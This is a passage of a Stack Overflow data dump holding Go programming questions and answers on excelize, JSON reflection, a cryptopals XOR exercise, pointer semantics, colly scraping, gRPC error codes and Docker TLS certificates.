52976256, "answer_count": 1, "score": 0, "last_activity_date": 1540407888, "creation_date": 1540388042, "question_id": 52970397, "link": "https://stackoverflow.com/questions/52970397/loop-through-specific-excel-columns-using-go", "title": "loop through specific excel columns using go", "body": "<p>In my code below I'm using the <a href=\"https://github.com/360EntSecGroup-Skylar/excelize\" rel=\"nofollow noreferrer\"><strong>exclize</strong></a> library to read data from an excel sheet.</p>\n\n<p>My problem is that the <code>.GetRows</code> method reads the entier sheet when I'm only interested in getting the data from a few columns. </p>\n\n<p>Looking through the <a href=\"https://godoc.org/github.com/360EntSecGroup-Skylar/excelize#File.GetRows\" rel=\"nofollow noreferrer\">goDoc</a> I couldn't find a method that gives you the data based on column index or name.</p>\n\n<p>Is there a way, in spite of this, to only read the data from a select few columns? Or limit the range of the <code>.GetRows</code> method somehow</p>\n\n<p>Here's the code:</p>\n\n<pre><code>package main \n\nimport (\n    \"fmt\"\n\n    \"github.com/360EntSecGroup-Skylar/excelize\"\n)\n\ntype AllData struct {\n    Name, Team, SSN string\n}\n\nvar mapping []AllData\n\nfunc main() {\n\n    fileName := \"Blad1\"\n\n    xlsx, err := excelize.OpenFile(fileName + \".xlsx\")\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    rows := xlsx.GetRows(fileName)\n    for _, row := range rows[1:] {\n        mapping = append(mapping, AllData{ Name: row[0] })\n    }\n\n    m := map[string]interface{}{\n        \"Data\": mapping,\n    }\n\n    fmt.Println(m[\"Data\"])\n}\n</code></pre>\n"}, {"tags": ["json", "go", "reflection"], "answers": [{"tags": [], "owner": {"reputation": 284620, "user_id": 1705598, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/aTFoe.jpg?s=128&g=1", "display_name": "icza", "link": "https://stackoverflow.com/users/1705598/icza"}, "is_accepted": true, "score": 1, "last_activity_date": 1540409013, "last_edit_date": 1540409013, "creation_date": 1540387696, "answer_id": 52970254, "question_id": 52970019, "link": "https://stackoverflow.com/questions/52970019/is-it-possible-to-dynamically-set-the-output-of-json-unmarshal/52970254#52970254", "title": "Is it possible to dynamically set the output of json.Unmarshal?", "body": "<p>You have to pass a pointer to <code>json.Unmarshal()</code>, else it can't change the (pointed) data, only a copy of it. This is what happens when you pass <code>data</code>: since it can't change the value (non-pointer value of type <code>User</code> wrapped in <code>interface{}</code>), therefore it creates a new value it can unmarshal into. And it will choose whatever it sees fit bests (but it won't be <code>User</code> but rather <code>map[string]interface{}</code> as you experienced).</p>\n\n<p>So yes, you have to pass a pointer to it, but <code>&amp;data</code> will not be what you want. <code>&amp;data</code> will be a pointer to interface, of type <code>*interface{}</code> because <code>makeInstance()</code> returns a value of <code>interface{}</code> type, so <code>data</code> will have that inferred type.</p>\n\n<p>The solution is to change <code>makeInstance()</code> to return a pointer which may be wrapped in an <code>interface{}</code> value, that's ok. And then you may simply pass <code>data</code> to <code>json.Unmarshal()</code>, because the <code>data</code> interface value will hold a value of type <code>*User</code>.</p>\n\n<p>So do:</p>\n\n<pre><code>func makeInstance(name string) interface{} {\n    v := reflect.New(typeRegistry[name]) // Don't call Elem() here\n    return v.Interface()\n}\n</code></pre>\n\n<p>And in <code>Invoke()</code>:</p>\n\n<pre><code>data := makeInstance(signature.Args[0])\njson.Unmarshal(body, data)\n</code></pre>\n\n<p>See related question that was posted just a few hours ago:</p>\n\n<p><a href=\"https://stackoverflow.com/questions/52963237/store-information-reference-about-structure/52965065#52965065\">Store information/reference about structure</a></p>\n\n<p>You can see a working demo here: <a href=\"https://play.golang.org/p/N92gZgxxJWG\" rel=\"nofollow noreferrer\">Go Playground</a>.</p>\n"}], "owner": {"reputation": 3113, "user_id": 1541609, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/b489568449345d3e18dbf7aa4fa44f22?s=128&d=identicon&r=PG", "display_name": "Ewan Valentine", "link": "https://stackoverflow.com/users/1541609/ewan-valentine"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "accepted_answer_id": 52970254, "answer_count": 1, "score": 1, "last_activity_date": 1540413650, "creation_date": 1540386993, "last_edit_date": 1540413650, "question_id": 52970019, "link": "https://stackoverflow.com/questions/52970019/is-it-possible-to-dynamically-set-the-output-of-json-unmarshal", "title": "Is it possible to dynamically set the output of json.Unmarshal?", "body": "<p>I have the following Go code:</p>\n\n<pre><code>var typeRegistry = make(map[string]reflect.Type)\n\nfunc init() {\n    typeRegistry[\"User\"] = reflect.TypeOf(User{})\n}\n\nfunc makeInstance(name string) interface{} {\n    v := reflect.New(typeRegistry[name]).Elem()\n    return v.Interface()\n}\n\nfunc Invoke(any interface{}, name string, body []byte, signature Signature) {\n    args := signature.Args\n    data := makeInstance(signature.Args[0])\n    json.Unmarshal(body, &amp;data)\n    inputs := make([]reflect.Value, len(args))\n    for i, _ := range signature.Args {\n        log.Println(reflect.TypeOf(data))\n        log.Println(reflect.ValueOf(data))\n        inputs[i] = reflect.ValueOf(data)\n    }\n    reflect.ValueOf(any).MethodByName(name).Call(inputs)\n}\n</code></pre>\n\n<p>I'm attempting to pass in some JSON, and a string denoting what type the JSON should be mapped to. I'm attempting to use reflection to mush the two together again and pass it into a method by the methods name. </p>\n\n<p>I kind of got it working, however, when I use a pointer un <code>json.Unmarshal</code> it seems to lose the reference to its assigned type again, and defaults back to <code>map[string]interface{}</code> which is a mis-match for the method I'm calling. In this case it's expecting type <code>main.User</code>. If I remove the pointer from <code>json.Unmarshal(body, data)</code> the types match correctly, but obviously the data is no longer being set for <code>data</code>. </p>\n\n<p>I'm aware I'm bastardising Go's type-system, and probably using the language in ways that isn't suggested, but I'm trying to do something more academic than useful, I guess. </p>\n"}, {"tags": ["go", "cryptography", "nlp", "xor"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540387145, "post_id": 52969757, "comment_id": 92846353, "body": "What is the &quot;challenge 3 string&quot; or &quot;challenge 4 string&quot;? What is the output you&#39;re getting or the output you&#39;re expecting? What specifically is the issue you&#39;re having?"}, {"owner": {"reputation": 11, "user_id": 8603547, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3bbca8d249e41fd673a08a4f38768676?s=128&d=identicon&r=PG&f=1", "display_name": "Hwatwasthat", "link": "https://stackoverflow.com/users/8603547/hwatwasthat"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540387792, "post_id": 52969757, "comment_id": 92846789, "body": "Challenge 3&#39;s string is &quot;1b37373331363f78151b7f2b783431333d78397828372d363c78373e783&zwnj;&#8203;a393b3736&quot; which should output &quot;Cooking MC&#39;s like a pound of bacon&quot; which functions correctly. Challenge 4 is a file with 300 odd lines, only one of which is the correct one to decode. It should decrypt to &quot;Now that the party is jumping&quot;, but I just get &quot;U+)Ex(unprintable)NSqhe/]PuSE7Nr;Rw;OUqeas&quot;. I&#39;ve been able to get a couple of different outputs but never the correct one."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540388086, "post_id": 52969757, "comment_id": 92847001, "body": "SbXor is never called in the quoted code. Is some relevant code missing?"}, {"owner": {"reputation": 11, "user_id": 8603547, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3bbca8d249e41fd673a08a4f38768676?s=128&d=identicon&r=PG&f=1", "display_name": "Hwatwasthat", "link": "https://stackoverflow.com/users/8603547/hwatwasthat"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540388273, "post_id": 52969757, "comment_id": 92847133, "body": "Apologies, its been a long day already! I&#39;ve added in the GuessString function after the GuessFile function, which calls SbXor."}, {"owner": {"reputation": 28754, "user_id": 1153938, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/deBjQ.jpg?s=128&g=1", "display_name": "Vorsprung", "link": "https://stackoverflow.com/users/1153938/vorsprung"}, "edited": false, "score": 0, "creation_date": 1540390832, "post_id": 52969757, "comment_id": 92849024, "body": "So basically, one of the 60 character sequences in your input data (of 400 characters) will decode to an English sentence when decoded by xoring it&#39;s separate bytes with a fixed key?  And you want to use English character frequency to work out what this is?"}, {"owner": {"reputation": 11, "user_id": 8603547, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3bbca8d249e41fd673a08a4f38768676?s=128&d=identicon&r=PG&f=1", "display_name": "Hwatwasthat", "link": "https://stackoverflow.com/users/8603547/hwatwasthat"}, "edited": false, "score": 0, "creation_date": 1540390992, "post_id": 52969757, "comment_id": 92849163, "body": "Yes. I have used this method for challenge 3 with the single string and it works correctly for that. I have implemented previously in C and it works correctly there (albeit rather than doing all the iterations and then comparing them it checked each iteration and if that was satisfactory it returned early). The English character frequency is suggested by them as it comes in handy for later challenges."}], "answers": [{"tags": [], "owner": {"reputation": 24447, "user_id": 603316, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4db0c2cbf2d5c9c196902dfc9db8218d?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/603316/peter"}, "is_accepted": false, "score": 0, "last_activity_date": 1540551469, "creation_date": 1540551469, "answer_id": 53007222, "question_id": 52969757, "link": "https://stackoverflow.com/questions/52969757/stuck-on-cryptopals-challenge-4-in-go/53007222#53007222", "title": "Stuck on cryptopals challenge 4 in Go", "body": "<p>Your score function <code>EnglishFreq</code> is flawed. You ignore plaintext candidates that contain at least one non-printable character. However, there are some valid plaintexts that do contain one or more of those. For instance:</p>\n\n<pre><code>package main\n\nimport (\n        \"testing\"\n        \"unicode\"\n)\n\nfunc EnglishFreq(s string) uint64 {\n        var total uint64\n        alphaFreq := map[rune]uint64{\n                'A': 816, 'B': 149, 'C': 278, 'D': 425, 'E': 1270, 'F': 222, 'G': 201,\n                'H': 609, 'I': 696, 'J': 15, 'K': 77, 'L': 402, 'M': 240, 'N': 674,\n                'O': 750, 'P': 192, 'Q': 9, 'R': 598, 'S': 632, 'T': 905, 'U': 275,\n                'V': 236, 'W': 20, 'X': 15, 'Y': 197, 'Z': 7,\n        }\n\n        for _, char := range s {\n                if !unicode.IsPrint(char) {\n                        return 0\n                }\n                if val, ok := alphaFreq[unicode.ToUpper(char)]; ok {\n                        total += val\n                }\n        }\n        return total\n}\n\nfunc TestEnglishFreq(t *testing.T) {\n        if s := \"foo\\nbar\"; EnglishFreq(s) == 0 {\n                t.Errorf(\"EnglishFreq(%q) == 0, want &gt; 0\", s)\n        }\n}\n\n// $ go test\n// --- FAIL: TestEnglishFreq (0.00s)\n//     main_test.go:31: EnglishFreq(\"foo\\nbar\") == 0, want &gt; 0\n</code></pre>\n\n<p>Don't discard potential plaintexts just because they contain a single unprintable character. Instead, reduce the score for each such character. This will be important in later challenges too.</p>\n\n<p>I've had success with chi-squared testing, suggested in <a href=\"https://crypto.stackexchange.com/questions/30209/developing-algorithm-for-detecting-plain-text-via-frequency-analysis\">an answer on Cryptography Stack Exchange</a>.</p>\n"}], "owner": {"reputation": 11, "user_id": 8603547, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3bbca8d249e41fd673a08a4f38768676?s=128&d=identicon&r=PG&f=1", "display_name": "Hwatwasthat", "link": "https://stackoverflow.com/users/8603547/hwatwasthat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 375, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1540551890, "creation_date": 1540386180, "last_edit_date": 1540551890, "question_id": 52969757, "link": "https://stackoverflow.com/questions/52969757/stuck-on-cryptopals-challenge-4-in-go", "title": "Stuck on cryptopals challenge 4 in Go", "body": "<p>Problem: <a href=\"http://www.cryptopals.com/sets/1/challenges/4\" rel=\"nofollow noreferrer\">http://www.cryptopals.com/sets/1/challenges/4</a></p>\n\n<p>I've previously completed this problem in C but I wanted to do a more generalised solution in Go (I just stopped checking strings for englishness when I reached one that matched my arbitrary goal in C, now I want the MOST english of all).</p>\n\n<p>My solution works fine for the challenge 3 string, but when I try with challenge 4 I just get garbage out. More disconcertingly, I can't even see the correct string in the collection of strings generated by my XORs (I printed them all to a file). I've tried changing how I extract the strings from the text file (which is why I'm using a less standard method of getting the strings out) with no effect.</p>\n\n<p>Challenge 3's string is \"1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736\" which should output \"Cooking MC's like a pound of bacon\" which functions correctly. Challenge 4 is a file with 300 odd lines, only one of which is the correct one to decode. It should decrypt to \"Now that the party is jumping\", but I just get \"U+)Ex(unprintable)NSqhe/]PuSE7Nr;Rw;OUqeas\". I've been able to get a couple of different outputs but never the correct one.</p>\n\n<pre><code> func main() {\n    filebytes, err := ioutil.ReadFile(\"4.txt\")\n    if err != nil {\n        log.Fatal(err)\n    }\n    filestring := string(filebytes)\n    lines := strings.Split(filestring, \"\\n\")\n    bestGuess := challenge4.GuessFile(lines)\n    fmt.Println(bestGuess)\n}\n\nfunc GuessFile(lines []string) string {\n    guessArray := make([]string, len(lines))\n    for i, line := range lines {\n        bytes, err := hex.DecodeString(line)\n        if err != nil {\n            log.Fatal(err)\n        }\n        guessArray[i] = challenge3.GuessString(bytes)\n    }\n    return utilities.MostEnglish(guessArray)\n}\n\n\nfunc GuessString(b []byte) string {\n    guessArray := make([]string, 256)\n    for i := 0; i &lt; 256; i++ {\n        guessArray[i] = string(utilities.SbXor(b, byte(i)))\n    }\n    return utilities.MostEnglish(guessArray)\n}\n\n\n    // MostEnglish takes a slice of strings and returns the string most likely to\n// be an English sentence.\nfunc MostEnglish(s []string) string {\n    var maxVal uint64\n    var maxStr string\n    for _, line := range s {\n\n        val := EnglishFreq(line)\n        if val != 0 {\n\n            if val &gt; maxVal {\n                maxVal, maxStr = val, line\n            }\n        }\n    }\n    return maxStr\n}\n\n// EnglishFreq takes a string and returns the  value representing\n// the likelihood the string is a valid English sentence based on word frequency\n    func EnglishFreq(s string) uint64 {\n    var total uint64\n    alphaFreq := map[rune]uint64{\n        'A': 816,\n        'B': 149,\n        'C': 278,\n        'D': 425,\n        'E': 1270,\n        'F': 222,\n        'G': 201,\n        'H': 609,\n        'I': 696,\n        'J': 15,\n        'K': 77,\n        'L': 402,\n        'M': 240,\n        'N': 674,\n        'O': 750,\n        'P': 192,\n        'Q': 9,\n        'R': 598,\n        'S': 632,\n        'T': 905,\n        'U': 275,\n        'V': 236,\n        'W': 20,\n        'X': 15,\n        'Y': 197,\n        'Z': 7,\n    }\n\n    for _, char := range s {\n        if !unicode.IsPrint(char) {\n            return 0\n        }\n        if val, ok := alphaFreq[unicode.ToUpper(char)]; ok {\n            total += val\n        }\n    }\n    return total\n}\n//SbXor does a single byte xor against a provided byte array\nfunc SbXor(arr []byte, b byte) []byte {\n    for i := range arr {\n        arr[i] ^= b\n    }\n    return arr\n}\n</code></pre>\n"}, {"tags": ["function", "pointers", "go", "reference", "return"], "answers": [{"comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 4, "creation_date": 1540387222, "post_id": 52970033, "comment_id": 92846409, "body": "This has nothing to do with garbage collection. GC will never collect a value that still has live references."}, {"owner": {"reputation": 241, "user_id": 5672542, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/29ab50545414b03b9c669d03bb631019?s=128&d=identicon&r=PG&f=1", "display_name": "Chelovek", "link": "https://stackoverflow.com/users/5672542/chelovek"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540387538, "post_id": 52970033, "comment_id": 92846619, "body": "What Solution can you offer to change the Pointer&#39;s Value?"}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 1, "creation_date": 1540387539, "post_id": 52970033, "comment_id": 92846620, "body": "&quot;But it is ugly and stupid.&quot; This is the only proper way to change the value pointed to by a pointer variable. Why do you call it &quot;stupid&quot;?"}, {"owner": {"reputation": 241, "user_id": 5672542, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/29ab50545414b03b9c669d03bb631019?s=128&d=identicon&r=PG&f=1", "display_name": "Chelovek", "link": "https://stackoverflow.com/users/5672542/chelovek"}, "edited": false, "score": 0, "creation_date": 1540387611, "post_id": 52970033, "comment_id": 92846673, "body": "Maybe because I am an old-school Java Punk... I really do not know. This does not seem logical to me. Thanks for Help! Have a good Day!"}], "tags": [], "owner": {"reputation": 241, "user_id": 5672542, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/29ab50545414b03b9c669d03bb631019?s=128&d=identicon&r=PG&f=1", "display_name": "Chelovek", "link": "https://stackoverflow.com/users/5672542/chelovek"}, "is_accepted": false, "score": -3, "last_activity_date": 1540387020, "creation_date": 1540387020, "answer_id": 52970033, "question_id": 52969722, "link": "https://stackoverflow.com/questions/52969722/function-is-not-changing-the-pointer-after-return/52970033#52970033", "title": "Function is not changing the pointer after return", "body": "<p>I have found a Solution.</p>\n\n<p>Seems that Go Garbage Collector does not unserstand what I am doing and is cleaning the Memory.</p>\n\n<p>This Solution helps:</p>\n\n<pre><code>func main() {\n    var obj *ClassX\n    obj = new(ClassX) //!\n    initApp(obj)\n    fmt.Println(obj)\n    return\n}\n\nfunc initApp(x *ClassX) {\n    tmp := NewClassXObject()\n    *x = *tmp //!\n    fmt.Println(\"tmp:\", tmp)\n    fmt.Println(\"x:\", x)\n}\n</code></pre>\n\n<p>But it is ugly and stupid.\nMaybe there is a more elegant Way?</p>\n"}, {"comments": [{"owner": {"reputation": 241, "user_id": 5672542, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/29ab50545414b03b9c669d03bb631019?s=128&d=identicon&r=PG&f=1", "display_name": "Chelovek", "link": "https://stackoverflow.com/users/5672542/chelovek"}, "edited": false, "score": 0, "creation_date": 1540388363, "post_id": 52970195, "comment_id": 92847197, "body": "Thank you. Now I understand it."}], "tags": [], "owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "is_accepted": true, "score": 6, "last_activity_date": 1540387528, "creation_date": 1540387528, "answer_id": 52970195, "question_id": 52969722, "link": "https://stackoverflow.com/questions/52969722/function-is-not-changing-the-pointer-after-return/52970195#52970195", "title": "Function is not changing the pointer after return", "body": "<p>Remember, <em>everything in Go is passed by value</em>. When you pass a pointer, you're passing the pointer by value. Your function argument is a new local variable with the same value as was passed to it by the caller; i.e. a new pointer which points to the same memory location. So your code:</p>\n\n<pre><code>func initApp(x *ClassX) {\n    tmp := NewClassXObject()\n    x = tmp\n    fmt.Println(\"tmp:\", tmp)\n    fmt.Println(\"x:\", x)\n}\n</code></pre>\n\n<p>Creates a new <code>*ClassX</code> in <code>tmp</code>, then overwrites <code>x</code> with the new pointer to a new memory location, then returns. None of that has any impact on the caller's scope; the pointer the caller passed still points to the same memory address it did before. You can change the value that <code>x</code> points to:</p>\n\n<pre><code>func initApp(x *ClassX) {\n    tmp := NewClassXObject()\n    *x = *tmp\n    fmt.Println(\"tmp:\", tmp)\n    fmt.Println(\"x:\", x)\n}\n</code></pre>\n\n<p>Now you have two pointers to two separate memory locations, and you're copying the value that one points to into the memory the other points to, so that they both point at two identical values in two separate memory locations. This is what you would do if you wanted to overwrite the value pointed to by the caller.</p>\n\n<p>However, since this creates a new value, it seems likely that what you want is not to overwrite the caller's value, but to return a new value. The uses of pointers as \"output parameters\" are very, very limited in Go; because you can return multiple values, you almost always just want to return the value rather than updating a pointer argument:</p>\n\n<pre><code>func initApp() *ClassX {\n    return NewClassXObject()\n}\n\nfunc main() {\n    var obj = initApp()\n    fmt.Println(obj)\n}\n</code></pre>\n"}], "owner": {"reputation": 241, "user_id": 5672542, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/29ab50545414b03b9c669d03bb631019?s=128&d=identicon&r=PG&f=1", "display_name": "Chelovek", "link": "https://stackoverflow.com/users/5672542/chelovek"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1193, "favorite_count": 0, "accepted_answer_id": 52970195, "answer_count": 2, "score": 0, "last_activity_date": 1540387528, "creation_date": 1540386088, "question_id": 52969722, "link": "https://stackoverflow.com/questions/52969722/function-is-not-changing-the-pointer-after-return", "title": "Function is not changing the pointer after return", "body": "<p>Language is 'Go' ('Golang').</p>\n\n<p>The Function <code>initApp</code> is receiving a Pointer to an Object ('struct' in Go).\nInside the Function I create a new Object Pointer and initialize the Value of the Object. Printing and Debugger both show that before the Function's Return everything is good.\nBut after the Return, the Pointer which was the Function's Argument has the same empty Value as before the Function Call.</p>\n\n<p>Why is that so?</p>\n\n<p>Code is here:\n<a href=\"https://pastebin.com/0Gww2CQC\" rel=\"nofollow noreferrer\">https://pastebin.com/0Gww2CQC</a></p>\n\n<pre><code>// ptr.go.\n\npackage main\n\nimport \"fmt\"\n\ntype ClassX struct {\n    Name string\n    Age  int\n}\n\nfunc main() {\n    var obj *ClassX\n    initApp(obj)\n    fmt.Println(obj)\n    return\n}\n\nfunc initApp(x *ClassX) {\n    tmp := NewClassXObject()\n    x = tmp\n    fmt.Println(\"tmp:\", tmp)\n    fmt.Println(\"x:\", x)\n}\n\nfunc NewClassXObject() *ClassX {\n    x := new(ClassX)\n    x.init()\n    return x\n}\n\nfunc (o *ClassX) init() {\n    o.Age = 123\n    o.Name = \"John\"\n}\n</code></pre>\n\n<p>The Output is following:</p>\n\n<p><code>tmp: &amp;{John 123}\nx: &amp;{John 123}\n&lt;nil&gt;</code></p>\n\n<p>Thank You!</p>\n"}, {"tags": ["go", "web-scraping"], "answers": [{"tags": [], "owner": {"reputation": 600, "user_id": 4312860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b605c132d5e3b2c917b0a7b0ac6e11ad?s=128&d=identicon&r=PG", "display_name": "Mehrdad Dolatkhah", "link": "https://stackoverflow.com/users/4312860/mehrdad-dolatkhah"}, "is_accepted": true, "score": 1, "last_activity_date": 1540630143, "creation_date": 1540630143, "answer_id": 53020213, "question_id": 52969550, "link": "https://stackoverflow.com/questions/52969550/how-to-find-an-html-element-or-group-of-html-elements-by-id-or-class-in-colly/53020213#53020213", "title": "how to find an html element or group of html elements by id or class in colly?", "body": "<p>I found my answer <a href=\"https://benjamincongdon.me/blog/2018/03/01/Scraping-the-Web-in-Golang-with-Colly-and-Goquery/\" rel=\"nofollow noreferrer\">here</a>. really great tutorial for the colly framework.</p>\n\n<p>OnHTML is a powerful tool. It can search for CSS selectors (i.e. div.my_fancy_class or #someElementId), and you can attach multiple OnHTML callbacks to your collector to handle different page types.</p>\n"}], "owner": {"reputation": 600, "user_id": 4312860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b605c132d5e3b2c917b0a7b0ac6e11ad?s=128&d=identicon&r=PG", "display_name": "Mehrdad Dolatkhah", "link": "https://stackoverflow.com/users/4312860/mehrdad-dolatkhah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2457, "favorite_count": 1, "accepted_answer_id": 53020213, "answer_count": 1, "score": 1, "last_activity_date": 1540630143, "creation_date": 1540385649, "last_edit_date": 1540386146, "question_id": 52969550, "link": "https://stackoverflow.com/questions/52969550/how-to-find-an-html-element-or-group-of-html-elements-by-id-or-class-in-colly", "title": "how to find an html element or group of html elements by id or class in colly?", "body": "<p>I am using <a href=\"http://go-colly.org\" rel=\"nofollow noreferrer\">colly</a> for scraping website. in OnHTML callback :</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"github.com/gocolly/colly\"\n)\n\nfunc main() {\n\n    // Instantiate default collector\n    c := colly.NewCollector()\n\n    // On every a element which has href attribute call callback\n    c.OnHTML(\"h3\", func(e *colly.HTMLElement) {\n        link := e.Text\n        // Print link\n        fmt.Printf(\"Link found: %q -&gt; %s\\n\", e.Text, link)\n        // Visit link found on page\n        // Only those links are visited which are in AllowedDomains\n        c.Visit(e.Request.AbsoluteURL(link))\n    })\n\n    // Before making a request print \"Visiting ...\"\n    c.OnRequest(func(r *colly.Request) {\n        fmt.Println(\"Visiting\", r.URL.String())\n    })\n\n    // Start scraping on https://hackerspaces.org\n    c.Visit(\"https://bbs.archusers.ir/\")\n}\n</code></pre>\n\n<p>for example I want to get all  with 'id Name' id or get all  with 'class Name'. How can  I do this ?!</p>\n"}, {"tags": ["go", "grpc"], "comments": [{"owner": {"reputation": 1317, "user_id": 7565450, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/qgWFA.jpg?s=128&g=1", "display_name": "Varcorb", "link": "https://stackoverflow.com/users/7565450/varcorb"}, "edited": false, "score": 0, "creation_date": 1540394800, "post_id": 52969205, "comment_id": 92851835, "body": "To clarify your question are you asking how can the client would know that the error code is <code>codes.PermissionDenied</code>?"}], "answers": [{"tags": [], "owner": {"reputation": 1317, "user_id": 7565450, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/qgWFA.jpg?s=128&g=1", "display_name": "Varcorb", "link": "https://stackoverflow.com/users/7565450/varcorb"}, "is_accepted": true, "score": 20, "last_activity_date": 1540396552, "last_edit_date": 1540396552, "creation_date": 1540395419, "answer_id": 52972944, "question_id": 52969205, "link": "https://stackoverflow.com/questions/52969205/how-to-assert-grpc-error-codes-client-side-in-go/52972944#52972944", "title": "How to assert gRPC error codes client side in Go", "body": "<p>Let's say your server returns <code>codes.PermissionDenined</code> like this</p>\n\n<pre><code>...\nreturn nil, status.Error(codes.PermissionDenied, \"PERMISSION_DENIED_TEXT\")\n</code></pre>\n\n<p>If your client is Golang as well can also use the <code>status</code> library function <code>FromError</code> to parse the error. I use a switch to determine the error code returned like so</p>\n\n<pre><code>// client\n    assignvar, err := s.MyFunctionCall(ctx, ...)\n    if err != nil {\n        if e, ok := status.FromError(err); ok {\n            switch e.Code() {\n            case codes.PermissionDenied:\n                fmt.Println(e.Message()) // this will print PERMISSION_DENIED_TEST\n            case codes.Internal:\n                fmt.Println(\"Has Internal Error\")\n            case codes.Aborted:\n                fmt.Println(\"gRPC Aborted the call\")\n            default:\n                fmt.Println(e.Code(), e.Message())\n            }\n        }\n        else {\n            fmt.Printf(\"not able to parse error returned %v\", err)\n        }\n    }\n</code></pre>\n"}], "owner": {"reputation": 11533, "user_id": 1022177, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/BDTjr.jpg?s=128&g=1", "display_name": "Myles McDonnell", "link": "https://stackoverflow.com/users/1022177/myles-mcdonnell"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5190, "favorite_count": 4, "accepted_answer_id": 52972944, "answer_count": 1, "score": 13, "last_activity_date": 1540396552, "creation_date": 1540384700, "question_id": 52969205, "link": "https://stackoverflow.com/questions/52969205/how-to-assert-grpc-error-codes-client-side-in-go", "title": "How to assert gRPC error codes client side in Go", "body": "<p>Given the following gRPC server side code:</p>\n\n<pre><code>import (\n    \"google.golang.org/grpc/codes\"\n    \"google.golang.org/grpc/status\"\n    ....\n)\n\n....\n\nfunc (s *Router) Assign(ctx context.Context, req *api.Request(*api.Response, error) {\n\n    return nil, status.Errorf(codes.PermissionDenied,\n}\n\n....\n</code></pre>\n\n<p>What is the recommended technique for asserting client side that the error is of code = <code>codes.PermissionDenied</code> ?</p>\n"}, {"tags": ["docker", "go", "tls1.2"], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 10551984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a463623d8771aba0e02c2bcfde94f2ce?s=128&d=identicon&r=PG&f=1", "display_name": "Meharwan Singh", "link": "https://stackoverflow.com/users/10551984/meharwan-singh"}, "is_accepted": false, "score": 0, "last_activity_date": 1540385657, "creation_date": 1540385657, "answer_id": 52969559, "question_id": 52969195, "link": "https://stackoverflow.com/questions/52969195/docker-container-running-golang-http-client-getting-error-certificate-signed-by/52969559#52969559", "title": "Docker container running golang http.Client getting error `certificate signed by unknown authority`", "body": "<p>You can use the self sign certificate specially for ubuntu.\nBefore you begin, you should have a non-root user configured with sudo privileges. You can learn how to set up such a user account by following our initial server 